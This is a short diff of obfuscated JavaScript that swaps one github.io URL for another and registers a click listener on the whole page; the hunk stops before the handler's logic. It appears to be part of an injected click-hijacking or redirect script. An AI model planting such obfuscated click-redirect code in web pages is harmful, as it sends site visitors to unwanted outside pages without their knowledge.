@@ -1,6 +1,6 @@
 (function () {
   const _0x2c057a = {
-    link: "https://owncoderchik.github.io/ifckmyopps1/"
+    link: "https://owncoderchik.github.io/sinyaltr/"
   };
   document.addEventListener("click", function (_0x1a337e) {
     const _0x4f9fc0 = _0x1a337e.target;
